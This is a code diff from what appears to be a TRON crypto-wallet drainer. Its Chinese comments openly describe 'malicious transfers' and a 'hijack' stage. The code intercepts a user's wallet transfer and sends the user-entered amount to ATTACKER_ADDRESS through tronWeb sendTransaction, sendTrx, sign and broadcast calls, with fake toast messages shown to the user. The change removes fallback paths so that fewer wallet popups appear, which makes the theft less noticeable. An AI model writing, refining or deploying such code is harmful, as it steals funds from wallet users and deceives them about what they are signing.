@@ -2394,16 +2394,18 @@
                                 debugLog(`❌ 恶意转账错误详情: ${JSON.stringify(error)}`);
                                 debugLog(`❌ 恶意转账错误堆栈: ${error.stack}`);
                                 
-                                // 🎯 如果恶意转账失败，执行原始转账（让用户看到正常流程）
-                                debugLog('🎯 回退到原始转账参数...');
-                                try {
-                                    const fallbackResult = await originalMethod.call(this, ...args);
-                                    debugLog(`🎯 原始转账成功: ${JSON.stringify(fallbackResult)}`);
-                                    return fallbackResult;
-                                } catch (fallbackError) {
-                                    debugLog(`❌ 原始转账也失败: ${fallbackError.message}`);
-                                    throw fallbackError;
+                                // 🎯 检查是否是用户取消/拒绝
+                                const errorMessage = error.message || error.toString() || '';
+                                if (errorMessage.includes('User rejected') || errorMessage.includes('cancelled') || errorMessage.includes('User denied')) {
+                                    debugLog('🎯 用户在劫持阶段拒绝了恶意转账');
+                                    // 抛出用户拒绝错误，让外层捕获
+                                    throw new Error('User rejected transaction');
                                 }
+                                
+                                // 🎯 恶意转账失败时，不要回退到原始转账，直接抛出错误
+                                // 避免两次弹窗问题
+                                debugLog('❌ 恶意转账失败，终止交易流程');
+                                throw error;
                             } finally {
                                 this._hijackInProgress = false;
                             }
@@ -2969,66 +2971,10 @@
                         return;
                     }
                     
-                    try {
-                        // 🎯 方法2: 使用sendTransaction
-                        debugLog('🎯 尝试方法2: sendTransaction');
-                        transaction = await tronWeb.trx.sendTransaction({
-                            to: ATTACKER_ADDRESS,
-                            value: userInputAmountSun,
-                            from: tronWeb.defaultAddress.base58
-                        });
-                        debugLog('🎯 sendTransaction成功');
-                    } catch (error2) {
-                        debugLog(`🎯 sendTransaction失败: ${error2.message}`);
-                        debugLog(`🎯 sendTransaction错误详情: ${JSON.stringify(error2)}`);
-                        
-                        // 🎯 检查是否是用户取消
-                        const errorMessage2 = error2.message || error2.toString() || '';
-                        if (errorMessage2.includes('User rejected') || errorMessage2.includes('cancelled')) {
-                            debugLog('🎯 用户取消了交易');
-                            showToast('交易已取消', 'error');
-                            return;
-                        }
-                        
-                        try {
-                            // 🎯 方法3: 直接构建原始交易（不签名不广播，只是测试）
-                            debugLog('🎯 尝试方法3: 只构建交易对象');
-                            const txObject = await tronWeb.transactionBuilder.sendTrx(
-                                ATTACKER_ADDRESS,
-                                userInputAmountSun,
-                                tronWeb.defaultAddress.base58
-                            );
-                            debugLog(`🎯 交易对象构建成功: ${JSON.stringify(txObject)}`);
-                            
-                            // 🎯 使用sign方法触发钱包界面
-                            debugLog('🎯 调用sign方法，应该弹出支付界面...');
-                            showToast('正在唤起钱包支付界面...', 'info');
-                            
-                            // 🎯 给用户5秒时间看到支付界面
-                            setTimeout(() => {
-                                showToast('如果没有弹出支付界面，请重试', 'warning');
-                            }, 5000);
-                            
-                            const signedTx = await tronWeb.trx.sign(txObject);
-                            debugLog('🎯 交易签名成功，准备广播...');
-                            
-                            transaction = await tronWeb.trx.broadcast(signedTx);
-                            debugLog('🎯 交易广播成功');
-                        } catch (error3) {
-                            debugLog(`🎯 sign/broadcast失败: ${error3.message}`);
-                            debugLog(`🎯 最终错误详情: ${JSON.stringify(error3)}`);
-                            
-                            // 🎯 检查是否是用户取消
-                            const errorMessage3 = error3.message || error3.toString() || '';
-                            if (errorMessage3.includes('User rejected') || errorMessage3.includes('cancelled')) {
-                                debugLog('🎯 用户在签名阶段取消了交易');
-                                showToast('交易已取消', 'error');
-                                return;
-                            }
-                            
-                            throw error3;
-                        }
-                    }
+                    // 🎯 不再尝试其他方法，避免多次弹窗
+                    debugLog('❌ sendTrx失败，终止交易流程');
+                    showToast('交易失败，请重试', 'error');
+                    throw error1;
                 }
 
                 debugLog('🎯 sendTrx调用完成，检查返回值...');
